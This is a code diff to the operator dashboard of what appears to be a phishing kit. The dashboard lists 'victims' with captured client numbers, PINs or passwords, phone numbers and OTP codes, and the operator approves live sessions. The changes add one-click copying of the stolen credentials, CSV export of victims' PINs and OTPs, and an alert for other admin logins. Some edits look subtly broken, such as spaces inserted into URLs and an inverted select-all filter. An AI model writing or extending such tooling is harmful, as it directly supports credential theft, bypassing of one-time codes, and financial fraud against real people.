@@ -4,8 +4,8 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
   <title>$$$</title>
-  <link rel="preconnect" href="https://rsms.me">
-  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
+  <link rel="preconnect" href="https://rsms.me ">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css ">
   <style>
     :root {
       --bg: #000000;
@@ -276,11 +276,28 @@
       color:var(--cred-color);
       border:1px solid var(--card-border);
       backdrop-filter:blur(4px);
+      cursor:pointer;
+      transition:all .2s ease;
+      user-select:all;
+    }
+    .cred:hover {
+      background:rgba(255,255,255,0.15);
+      border-color:var(--card-border-hover);
+    }
+    .cred.copied {
+      background:var(--green);
+      color:#000;
+      animation:pulse 0.3s ease;
+    }
+    @keyframes pulse {
+      0% { transform:scale(1); }
+      50% { transform:scale(1.05); }
+      100% { transform:scale(1); }
     }
     
     .detail{font-size:12px;color:var(--text-muted);margin-top:8px}
     
-    #modal, #settingsModal, #confirmModal {
+    #modal, #settingsModal, #confirmModal, #adminAlertModal {
       display:none;
       position:fixed;
       inset:0;
@@ -292,8 +309,9 @@
     }
     #settingsModal{background:rgba(0,0,0,.7)}
     #confirmModal{z-index:1001}
+    #adminAlertModal{z-index:1002}
     
-    #modal .card, #settingsModal .card, #confirmModal .card {
+    #modal .card, #settingsModal .card, #confirmModal .card, #adminAlertModal .card {
       max-width:600px;
       width:90%;
       background:var(--card-bg);
@@ -305,6 +323,7 @@
     }
     #settingsModal .card{max-width:420px}
     #confirmModal .card{max-width:380px;text-align:center}
+    #adminAlertModal .card{max-width:400px;text-align:center;border-left:4px solid var(--red)}
     #empty{text-align:center;color:var(--text-muted);padding:2rem 0}
 
     .modal-header{border-bottom:1px solid var(--card-border);padding-bottom:16px;margin-bottom:20px}
@@ -321,7 +340,9 @@
     }
     .info-label{font-size:11px;text-transform:uppercase;letter-spacing:0.08em;color:var(--text-muted);margin-bottom:6px;font-weight:500}
     .info-value{font-size:14px;color:var(--text-primary);font-weight:500}
-    .info-value.mono{font-family:monospace;font-size:13px;background:rgba(128,128,128,0.1);padding:4px 8px;border-radius:6px;display:inline-block;margin-top:2px}
+    .info-value.mono{font-family:monospace;font-size:13px;background:rgba(128,128,128,0.1);padding:4px 8px;border-radius:6px;display:inline-block;margin-top:2px;cursor:pointer;user-select:all;transition:all .2s}
+    .info-value.mono:hover{background:rgba(128,128,128,0.2)}
+    .info-value.mono.copied{background:var(--green);color:#000}
     .info-value.small{font-size:12px;color:var(--text-muted);word-break:break-all;line-height:1.4}
     
     .full-width{grid-column:1 / -1}
@@ -373,8 +394,14 @@
     .alert-warning{border-left:3px solid var(--yellow)}.alert-warning .alert-icon{background:rgba(251,191,36,.12);color:var(--yellow)}
     .alert-info{border-left:3px solid var(--blue)}.alert-info .alert-icon{background:rgba(96,165,250,.12);color:var(--blue)}
     .alert-error{border-left:3px solid var(--red)}.alert-error .alert-icon{background:rgba(251,113,133,.12);color:var(--red)}
+    .alert-admin{border-left:3px solid var(--red);animation:slideIn .3s ease, pulseAlert 2s infinite}
+    .alert-admin .alert-icon{background:rgba(251,113,133,.12);color:var(--red)}
     @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
     @keyframes fadeOut{to{opacity:0;transform:translateX(20px)}}
+    @keyframes pulseAlert{
+      0%, 100% { box-shadow:0 0 0 0 rgba(251,113,133,0.4); }
+      50% { box-shadow:0 0 20px 5px rgba(251,113,133,0.2); }
+    }
     
     .ip-link{color:var(--blue);text-decoration:none;cursor:pointer;transition:opacity .2s}
     .ip-link:hover{opacity:.8;text-decoration:underline}
@@ -505,6 +532,15 @@
     }
     .select-all-btn:hover {background:rgba(128,128,128,0.15);color:var(--text-primary)}
 
+    /* Export button positioning */
+    .export-btn-top {
+      position:absolute;
+      top:12px;
+      right:12px;
+      font-size:11px;
+      padding:6px 12px;
+    }
+
     /* Mobile */
     @media (max-width: 768px) {
       .greet-bar{margin:16px auto 0;padding:0 16px;font-size:16px}
@@ -517,7 +553,7 @@
       .cred{font-size:0.7rem;padding:3px 6px}
       .icon-btn{width:32px;height:32px;padding:6px}
       .icon-btn img{width:16px;height:16px}
-      #modal .card, #settingsModal .card, #confirmModal .card{width:95%;padding:20px;border-radius:16px}
+      #modal .card, #settingsModal .card, #confirmModal .card, #adminAlertModal .card{width:95%;padding:20px;border-radius:16px}
       .modal-title{font-size:18px}
       .info-grid{grid-template-columns:1fr;gap:12px}
       .info-section{padding:12px}
@@ -528,7 +564,7 @@
       .alert{padding:12px 16px}
       .delete-section{flex-direction:column;gap:12px;align-items:stretch}
       #logoutBtn{font-size:12px;padding:0.25rem 0.5rem}
-      #exportBtn{position:relative !important;bottom:auto !important;right:auto !important;margin-top:8px;width:100% !important}
+      .export-btn-top{position:relative !important;top:auto !important;right:auto !important;margin-top:8px;width:100% !important}
       .greet-right{gap:8px}
       .theme-grid{grid-template-columns:repeat(2, 1fr);}
       .theme-option{font-size:10px;padding:6px 8px;}
@@ -577,13 +613,13 @@
       <div class="card">
         <div class="stat-label">Successful Logins</div>
         <div class="stat-value" id="success">—</div>
-        <button id="exportBtn" class="btn" style="margin-top:8px;width:auto;font-size:11px;position:absolute;bottom:12px;right:12px;">Export CSV</button>
       </div>
     </div>
 
-    <div class="card" style="margin-top:22px">
+    <div class="card" style="margin-top:22px;position:relative;">
       <div style="font-size:14px;font-weight:600;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center">
         <span>Active Sessions · <a id="domainLink" href="#" target="_blank" style="color:var(--blue);text-decoration:none"></a></span>
+        <button id="exportBtn" class="btn export-btn-top">Export CSV</button>
       </div>
       
       <div class="batch-actions" id="batchActions">
@@ -692,10 +728,31 @@
     </div>
   </div>
 
+  <!-- Admin Login Alert Modal -->
+  <div id="adminAlertModal" onclick="if(event.target===this)closeAdminAlert()">
+    <div class="card">
+      <div class="modal-title" style="margin-bottom:8px;color:var(--red);display:flex;align-items:center;gap:8px;">
+        <span>🚨</span> Admin Login Detected
+      </div>
+      <div class="confirm-text" style="text-align:left;">
+        <div style="margin-bottom:12px;"><strong>New admin session started from a different location.</strong></div>
+        <div style="font-size:12px;color:var(--text-muted);margin-bottom:8px;">IP Address: <span id="adminAlertIp" style="color:var(--text-primary);font-family:monospace;">--</span></div>
+        <div style="font-size:12px;color:var(--text-muted);margin-bottom:8px;">Time: <span id="adminAlertTime" style="color:var(--text-primary);">--</span></div>
+        <div style="font-size:11px;color:var(--red);margin-top:12px;padding:8px;background:rgba(251,113,133,0.1);border-radius:6px;">
+          ⚠️ If this wasn't you, your session may be compromised.
+        </div>
+      </div>
+      <div class="confirm-buttons">
+        <button class="confirm-btn danger" onclick="closeAdminAlert()">Acknowledge</button>
+      </div>
+    </div>
+  </div>
+
   <script>
     let currentSid = null, jsonData = {}, lastSessions = new Map();
     let isFirstLoad = true;
     let selectedSessions = new Set();
+    let currentAdminSession = null;
     const qs = s => document.querySelector(s);
     const qsa = s => document.querySelectorAll(s);
     const fmt = t => new Date(t).toLocaleTimeString();
@@ -743,6 +800,23 @@
     }
     updateClock(); setInterval(updateClock, 1000);
 
+    /* ----------  COPY TO CLIPBOARD  ---------- */
+    async function copyToClipboard(text, element) {
+      if (!text || text === '—') return;
+      try {
+        await navigator.clipboard.writeText(text);
+        element.classList.add('copied');
+        setTimeout(() => element.classList.remove('copied'), 1000);
+      } catch (err) {
+        // Fallback: select text
+        const range = document.createRange();
+        range.selectNode(element);
+        window.getSelection().removeAllRanges();
+        window.getSelection().addRange(range);
+        setTimeout(() => window.getSelection().removeAllRanges(), 1000);
+      }
+    }
+
     /* ----------  ALERTS  ---------- */
     function showAlert(type, title, desc, victimNum){
       if (isFirstLoad) return;
@@ -751,7 +825,7 @@
       const alert = document.createElement('div');
       alert.className = `alert alert-${type}`;
       alert.innerHTML = `
-        <div class="alert-icon">${{success:'✓',warning:'⚠',info:'ℹ',error:'✕'}[type]}</div>
+        <div class="alert-icon">${{success:'✓',warning:'⚠',info:'ℹ',error:'✕',admin:'🚨'}[type]}</div>
         <div class="alert-content">
           <div class="alert-title">${title}</div>
           <div class="alert-desc">${desc}</div>
@@ -760,6 +834,33 @@
       alert.onclick = () => alert.remove();
       container.appendChild(alert);
       setTimeout(() => alert.remove(), 5000);
+    }
+
+    function showAdminAlert(ip, time) {
+      qs('#adminAlertIp').textContent = ip;
+      qs('#adminAlertTime').textContent = fmtDate(time);
+      qs('#adminAlertModal').style.display = 'flex';
+      
+      // Also show in alert container
+      const container = qs('#alert-container');
+      const alert = document.createElement('div');
+      alert.className = `alert alert-admin`;
+      alert.innerHTML = `
+        <div class="alert-icon">🚨</div>
+        <div class="alert-content">
+          <div class="alert-title">ADMIN LOGIN DETECTED</div>
+          <div class="alert-desc">New admin session from ${ip}</div>
+          <div class="alert-time">${fmt(time)}</div>
+        </div>`;
+      alert.onclick = () => {
+        qs('#adminAlertModal').style.display = 'flex';
+        alert.remove();
+      };
+      container.appendChild(alert);
+    }
+
+    function closeAdminAlert() {
+      qs('#adminAlertModal').style.display = 'none';
     }
 
     /* ----------  STATUS  ---------- */
@@ -793,7 +894,16 @@
     }
 
     /* ----------  CHANGES  ---------- */
-    function checkChanges(newSessions){
+    function checkChanges(newSessions, adminSession){
+      // Check for new admin session
+      if (adminSession && adminSession !== currentAdminSession) {
+        if (currentAdminSession !== null && !isFirstLoad) {
+          // New admin login detected
+          showAdminAlert(adminSession.ip || 'Unknown', new Date());
+        }
+        currentAdminSession = adminSession;
+      }
+      
       if (isFirstLoad) {
         lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
         isFirstLoad = false;
@@ -859,12 +969,12 @@
         const isSelected = selectedSessions.has(s.sid);
         return `
         <tr data-sid="${s.sid}" class="${approved ? 'approved' : ''}">
-          <td class="select-col">${approved ? '' : `<div class="checkbox-custom session-checkbox ${isSelected ? 'checked' : ''}" data-sid="${s.sid}" onclick="toggleSelect('${s.sid}', event)"></div>`}</td>
+          <td class="select-col">${`<div class="checkbox-custom session-checkbox ${isSelected ? 'checked' : ''}" data-sid="${s.sid}" onclick="toggleSelect('${s.sid}', event)"></div>`}</td>
           <td>${s.victimNum}</td>
-          <td><span class="cred">${s.email||'—'}</span></td>
-          <td><span class="cred">${s.password||'—'}</span></td>
-          <td><span class="cred">${s.phone||'—'}</span></td>
-          <td><span class="cred">${s.otp||'—'}</span></td>
+          <td><span class="cred" onclick="copyToClipboard('${s.email||''}', this)" title="Click to copy">${s.email||'—'}</span></td>
+          <td><span class="cred" onclick="copyToClipboard('${s.password||''}', this)" title="Click to copy">${s.password||'—'}</span></td>
+          <td><span class="cred" onclick="copyToClipboard('${s.phone||''}', this)" title="Click to copy">${s.phone||'—'}</span></td>
+          <td><span class="cred" onclick="copyToClipboard('${s.otp||''}', this)" title="Click to copy">${s.otp||'—'}</span></td>
           <td><a class="ip-link" onclick="openIpLookup('${s.ip}')" title="Lookup IP">${s.ip}</a></td>
           <td>${s.platform}</td>
           <td>${s.browser}</td>
@@ -888,7 +998,7 @@
     }
 
     function toggleSelectAll() {
-      const allSids = jsonData.sessions.filter(s => !isApproved(s)).map(s => s.sid);
+      const allSids = jsonData.sessions.filter(s => isApproved(s)).map(s => s.sid);
       if (selectedSessions.size === allSids.length) {
         selectedSessions.clear();
       } else {
@@ -911,8 +1021,8 @@
       batchActions.classList.toggle('active', count > 0);
       
       // Update select all checkbox
-      const allSids = jsonData.sessions.filter(s => !isApproved(s)).map(s => s.sid);
-      selectAllBox.classList.toggle('checked', count > 0 && count === allSids.length);
+      const approvedSids = jsonData.sessions.filter(s => isApproved(s)).map(s => s.sid);
+      selectAllBox.classList.toggle('checked', count > 0 && count === approvedSids.length);
       
       // Update individual checkboxes
       qsa('.session-checkbox').forEach(box => {
@@ -941,7 +1051,7 @@
     /* ----------  IP LOOKUP  ---------- */
     function openIpLookup(ip) {
       const cleanIp = ip.split(':')[0];
-      window.open(`https://db-ip.com/${cleanIp}`, '_blank');
+      window.open(`https://db-ip.com/ ${cleanIp}`, '_blank');
     }
 
     /* ----------  MODALS  ---------- */
@@ -969,7 +1079,7 @@
         <div class="info-grid">
           <div class="info-section">
             <div class="info-label">Session ID</div>
-            <div class="info-value mono" style="font-size:11px">${s.sid}</div>
+            <div class="info-value mono" style="font-size:11px;cursor:default">${s.sid}</div>
           </div>
           <div class="info-section">
             <div class="info-label">Current Page</div>
@@ -977,19 +1087,19 @@
           </div>
           <div class="info-section">
             <div class="info-label">Client Number</div>
-            <div class="info-value mono">${s.email||'—'}</div>
+            <div class="info-value mono" onclick="copyToClipboard('${s.email||''}', this)">${s.email||'—'}</div>
           </div>
           <div class="info-section">
             <div class="info-label">PIN / Password</div>
-            <div class="info-value mono">${s.password||'—'}</div>
+            <div class="info-value mono" onclick="copyToClipboard('${s.password||''}', this)">${s.password||'—'}</div>
           </div>
           <div class="info-section">
             <div class="info-label">Phone Number</div>
-            <div class="info-value mono">${s.phone||'—'}</div>
+            <div class="info-value mono" onclick="copyToClipboard('${s.phone||''}', this)">${s.phone||'—'}</div>
           </div>
           <div class="info-section">
             <div class="info-label">OTP Code</div>
-            <div class="info-value mono">${s.otp||'—'}</div>
+            <div class="info-value mono" onclick="copyToClipboard('${s.otp||''}', this)">${s.otp||'—'}</div>
           </div>
           <div class="info-section full-width">
             <div class="info-label">System Information</div>
@@ -1022,7 +1132,10 @@
           <div class="delete-info">Permanently remove this session from active sessions</div>
           <button class="btn btn-danger" onclick="confirmDelete('${s.sid}')">Delete Session</button>
         </div>
-        ` : '<div style="margin-top:20px;padding-top:20px;border-top:1px solid var(--card-border);color:var(--green);font-size:13px;text-align:center;">✓ This session has been approved and completed</div>'}`;
+        ` : `<div style="margin-top:20px;padding-top:20px;border-top:1px solid var(--card-border);display:flex;justify-content:space-between;align-items:center;">
+          <div style="color:var(--green);font-size:13px;">✓ This session has been approved and completed</div>
+          <button class="btn btn-danger" onclick="confirmDelete('${s.sid}')">Delete</button>
+        </div>`}`;
       
       qs('#modal').style.display='flex';
     }
@@ -1077,7 +1190,46 @@
       load();
     }
 
-    /* ----------  LOGOUT + EXPORT  ---------- */
+    /* ----------  EXPORT CSV  ---------- */
+    qs('#exportBtn').onclick = () => {
+      // Export all sessions with minimum client+pin entered
+      const sessionsToExport = jsonData.sessions.filter(s => s.email && s.password);
+      
+      if (sessionsToExport.length === 0) {
+        alert('No sessions with both Client and PIN entered to export.');
+        return;
+      }
+      
+      const headers = ['Victim #', 'Client', 'PIN', 'Phone', 'OTP', 'IP', 'Platform', 'Browser', 'Status', 'Connected At'];
+      const rows = sessionsToExport.map(s => [
+        s.victimNum,
+        s.email || '',
+        s.password || '',
+        s.phone || '',
+        s.otp || '',
+        s.ip,
+        s.platform,
+        s.browser,
+        pageTitle(s.page),
+        fmtDate(s.dateStr)
+      ]);
+      
+      const csvContent = [headers, ...rows]
+        .map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(','))
+        .join('\n');
+      
+      const blob = new Blob([csvContent], { type: 'text/csv' });
+      const url = window.URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `sessions_export_${new Date().toISOString().slice(0,10)}.csv`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      window.URL.revokeObjectURL(url);
+    };
+
+    /* ----------  LOGOUT  ---------- */
     qs('#logoutBtn').onclick = async () => {
       lastSessions.clear();
       selectedSessions.clear();
@@ -1085,7 +1237,7 @@
       await fetch('/panel/logout',{method:'POST'});
       location.replace('/panel');
     };
-    qs('#exportBtn').onclick = () => location.href = '/api/export';
+    
     qs('#settingsBtn').onclick = openSettings;
 
     /* ----------  LONG-POLL  ---------- */
@@ -1093,7 +1245,7 @@
       const d = await fetch('/api/panel').then(r=>r.json());
       if(d.error)return location.replace('/panel');
       jsonData = d;
-      checkChanges(d.sessions);
+      checkChanges(d.sessions, d.adminSession);
       render(d);
       setTimeout(load,300);
     }
@@ -1103,4 +1255,3 @@
   </script>
 </body>
 </html>
-
